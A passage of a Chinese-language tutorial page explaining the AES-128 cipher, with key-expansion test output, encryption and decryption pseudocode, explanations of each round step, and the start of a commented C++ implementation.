class="number">0x16</span>,</span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>&#125;;</span><br><span class="line"></span><br><span class="line">word w[<span class="number">4</span>*(Nr+<span class="number">1</span>)];</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;KEY IS: &quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; ++i)</span><br><span class="line">        <span class="comment">//cout &lt;&lt; hex: 这是用于输出的C++代码，它将后续输出的整数以十六进制形式打印。</span></span><br><span class="line">        <span class="comment">//key[i].to_ulong(): 这一部分访问密钥 key 的第 i 个字节，然后使用 to_ulong() 函数将这个字节的二进制值转换为十进制值。</span></span><br><span class="line">cout &lt;&lt; hex &lt;&lt; key[i].<span class="built_in">to_ulong</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeyExpansion</span>(key, w);</span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>*(Nr+<span class="number">1</span>); ++i)</span><br><span class="line">        <span class="comment">//dec 是一个输出控制符，它告诉 cout 在输出 i（索引）时使用十进制表示</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;w[&quot;</span> &lt;&lt; dec &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; hex &lt;&lt; w[i].<span class="built_in">to_ulong</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="1-3-2-结果">1.3.2 结果</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">KEY IS: 2b 7e 15 16 28 ae d2 a6 ab f7 15 88 9 cf 4f 3c</span><br><span class="line">w[0] = 2b7e1516</span><br><span class="line">w[1] = 28aed2a6</span><br><span class="line">w[2] = abf71588</span><br><span class="line">w[3] = 9cf4f3c</span><br><span class="line">w[4] = a0fafe17</span><br><span class="line">w[5] = 88542cb1</span><br><span class="line">w[6] = 23a33939</span><br><span class="line">w[7] = 2a6c7605</span><br><span class="line">w[8] = f2c295f2</span><br><span class="line">w[9] = 7a96b943</span><br><span class="line">w[10] = 5935807a</span><br><span class="line">w[11] = 7359f67f</span><br><span class="line">w[12] = 3d80477d</span><br><span class="line">w[13] = 4716fe3e</span><br><span class="line">w[14] = 1e237e44</span><br><span class="line">w[15] = 6d7a883b</span><br><span class="line">w[16] = ef44a541</span><br><span class="line">w[17] = a8525b7f</span><br><span class="line">w[18] = b671253b</span><br><span class="line">w[19] = db0bad00</span><br><span class="line">w[20] = d4d1c6f8</span><br><span class="line">w[21] = 7c839d87</span><br><span class="line">w[22] = caf2b8bc</span><br><span class="line">w[23] = 11f915bc</span><br><span class="line">w[24] = 6d88a37a</span><br><span class="line">w[25] = 110b3efd</span><br><span class="line">w[26] = dbf98641</span><br><span class="line">w[27] = ca0093fd</span><br><span class="line">w[28] = 4e54f70e</span><br><span class="line">w[29] = 5f5fc9f3</span><br><span class="line">w[30] = 84a64fb2</span><br><span class="line">w[31] = 4ea6dc4f</span><br><span class="line">w[32] = ead27321</span><br><span class="line">w[33] = b58dbad2</span><br><span class="line">w[34] = 312bf560</span><br><span class="line">w[35] = 7f8d292f</span><br><span class="line">w[36] = ac7766f3</span><br><span class="line">w[37] = 19fadc21</span><br><span class="line">w[38] = 28d12941</span><br><span class="line">w[39] = 575c006e</span><br><span class="line">w[40] = d014f9a8</span><br><span class="line">w[41] = c9ee2589</span><br><span class="line">w[42] = e13f0cc8</span><br><span class="line">w[43] = b6630ca6</span><br></pre></td></tr></table></figure><hr><h3 id="2-分组加密">2.分组加密</h3><h4 id="2-1-伪代码">2.1 伪代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Cipher</span>(byte in[<span class="number">4</span>*Nb], byte out[<span class="number">4</span>*Nb], word w[Nb*Nr+<span class="number">1</span>])</span><br><span class="line">begin</span><br><span class="line">    byte state[<span class="number">4</span>,Nb]</span><br><span class="line">    state = in</span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, w[<span class="number">0</span>, Nb<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> round = <span class="number">1</span> step <span class="number">1</span> to Nr<span class="number">-1</span></span><br><span class="line">        <span class="built_in">SubBytes</span>(state)</span><br><span class="line">        <span class="built_in">ShiftRows</span>(state)</span><br><span class="line">        <span class="built_in">MixColumns</span>(state)</span><br><span class="line">        <span class="built_in">AddRoundKey</span>(state, w[round*Nb, (round+<span class="number">1</span>)*Nb<span class="number">-1</span>])</span><br><span class="line">    end <span class="keyword">for</span></span><br><span class="line">    <span class="built_in">SubBytes</span>(state)</span><br><span class="line">    <span class="built_in">ShiftRows</span>(state)</span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, w[Nr*Nb, (Nr+<span class="number">1</span>)*Nb<span class="number">-1</span>])</span><br><span class="line">    Out = state</span><br><span class="line">  end</span><br></pre></td></tr></table></figure><p>从伪代码描述中可以看出，<code>AES </code>加密时涉及到的子程序有<code>SubBytes()</code>、<code>ShiftRows()</code>、<code>MixColumns()</code>和<code>AddRoundKey()</code>,即字节替换，位位移，列混合，密钥轮加。<s>不清楚请自动移步到右侧二、原理的流程图中</s></p><h4 id="2-2-字节替换-SubBytes">2.2 字节替换-SubBytes()</h4><p><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_5ba374e470-9.jpg" alt="9.jpg"><br>在密钥扩展部分已经讲过了，<code>S</code>盒是一个 16 行 16 列的表，表中每个元素都是一个字节。<code>S</code>盒变换很简单：函数<code>SubBytes()</code>接受一个 4x4 的字节矩阵作为输入，对其中的每个字节，前四位组成十六进制数<code>x</code>作为行号，后四位组成的十六进制数 <code>y</code> 作为列号，查找表中对应的值替换原来位置上的字节。</p><h4 id="2-3-行位移-ShiftRows">2.3 行位移-ShiftRows()</h4><p><code>AES</code> 的行移位也是一个简单的左循环移位操作。当密钥长度为<code>128</code>比特时，状态矩阵的第<code>0</code>行左移<code>0</code>字节，第<code>1</code>行左移<code>1</code>字节，第<code>2</code>行左移<code>2</code>字节，第<code>3</code>行左移<code>3</code>字节<br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_c69bcb0270-10.png" alt="10.png"></p><h4 id="2-4-列混合-MixColumns">2.4 列混合-MixColumns()</h4><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与<strong>固定的矩阵</strong>(即下图左乘后面的矩阵）相乘，得到混淆后的状态矩阵。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_1abc383170-5.png" alt="5.png"><br>这里需要注意的是矩阵元素中的乘法和加法都是定义在居于$Z_2[x]$中不可约多项式$ m(x) = x^8 + x^4 + x^3 + x + 1 $ 构造的$ GF(2^8) $ 上的二元运算。<strong>加法等价于两个字节的异或，乘法运算比较复杂，是伽罗华域（GF,有限域）上的乘法</strong><br>请仔细阅读下面例子，获取计算<code>·2</code>和<code>·3</code><br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_70331a0d70-10.jpg" alt="10.jpg"><br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_42be20ab70-11.jpg" alt="11.jpg"></p><h4 id="2-5-轮密钥加-AddRoundKey">2.5 轮密钥加-AddRoundKey()</h4><p>扩展密钥只参与了这一步。根据当前加密的轮数，用<code>w[]</code>中的<code>4</code>个扩展密钥与矩阵的<code> 4</code> 个列进行按位异或，即将<code>128</code>位轮密钥<code>Ki</code>同状态矩阵中的数据进行逐位异或操作。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_9108e9e670-6.png" alt="6.png"></p><hr><h3 id="3-分组解密">3. 分组解密</h3><h4 id="3-1-伪代码">3.1 伪代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">InvCipher</span>(byte in[<span class="number">4</span>*Nb], byte out[<span class="number">4</span>*Nb], word w[Nb*Nr+<span class="number">1</span>])</span><br><span class="line">begin</span><br><span class="line">    byte state[<span class="number">4</span>,Nb]</span><br><span class="line">    state = in</span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, w[Nr*Nb, (Nr+<span class="number">1</span>)*Nb<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> round = Nr<span class="number">-1</span> step <span class="number">-1</span> downto <span class="number">1</span></span><br><span class="line">        <span class="built_in">InvShiftRows</span>(state)</span><br><span class="line">        <span class="built_in">InvSubBytes</span>(state)</span><br><span class="line">        <span class="built_in">AddRoundKey</span>(state, w[round*Nb, (round+<span class="number">1</span>)*Nb<span class="number">-1</span>])</span><br><span class="line">        <span class="built_in">InvMixColumns</span>(state)</span><br><span class="line">    end <span class="keyword">for</span></span><br><span class="line">    <span class="built_in">SubBytes</span>(state)</span><br><span class="line">    <span class="built_in">ShiftRows</span>(state)</span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, w[<span class="number">0</span>, Nb<span class="number">-1</span>])</span><br><span class="line">    Out = state</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>从伪代码描述中可以看出，<code>AES</code> 加密时涉及到的子程序有<code>SubBytes()</code>、<code>ShiftRows()</code>、<code>MixColumns()</code>和<code>AddRoundKey()</code>。下面我们一个一个进行介绍：</p><h4 id="3-2-逆行变换-InvShiftRows">3.2 逆行变换-InvShiftRows()</h4><p>上面讲到<code>ShiftRows()</code>是对矩阵的每一行进行循环左移，所以<code>InvShiftRows()</code>是对矩阵每一行进行循环右移。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_caa84b2670-7.png" alt="7.png"></p><h4 id="3-3-逆-S-盒变换-InvSubBytes">3.3 逆 S 盒变换-InvSubBytes()</h4><p>与 S 盒变换一样，也是查表，查表的方式也一样，只不过查的是另外一个置换表（S-Box 的逆表，下面 C++代码中有）。</p><h4 id="3-4-逆列变换-InvMixColumns">3.4 逆列变换-InvMixColumns()</h4><p>与列变换的方式一样，只不过计算公式的系数矩阵发生了变化。详细知识请自行去了解，这里我们只需要记住总结的函数即可，如下图：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_50a5a8e470-8.png" alt="8.png"></p><hr><h2 id="四、C-代码">四、C++代码</h2><h3 id="1-代码">1. 代码</h3><blockquote><p>有些函数的注释我咋上面密钥扩展中已经写过了，还有解密的过程和加密十分相似，看懂加密解密自然不在话下，这些竹丝便不再重复，若有其他问题请评论提问（￣︶￣）↗ 　<s>先看懂上面一步一步来 ╰（‵□′）╯</s></p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br></pre></td><td class="code"><pre><span class="line">//超详细注释来袭  ψ(｀∇´)ψ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;bitset&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">using namespace <span class="keyword">std</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">//因为代码中大量使用bit的计算，所以直接typedef，一个字节为<span class="number">8</span>位，一个字<span class="number">32</span>位</span><br><span class="line">typedef bitset&lt;<span class="number">8</span>&gt; <span class="built_in">byte</span><span class="comment">;</span></span><br><span class="line">typedef bitset&lt;<span class="number">32</span>&gt; <span class="built_in">word</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">const <span class="keyword">int</span> Nr = <span class="number">10</span><span class="comment">;  // AES-128需要 10 轮加密</span></span><br><span class="line">const <span class="keyword">int</span> Nk = <span class="number">4</span><span class="comment">;   // Nk 表示输入密钥的 word 个数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">byte</span> S_Box[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">&#123;<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span 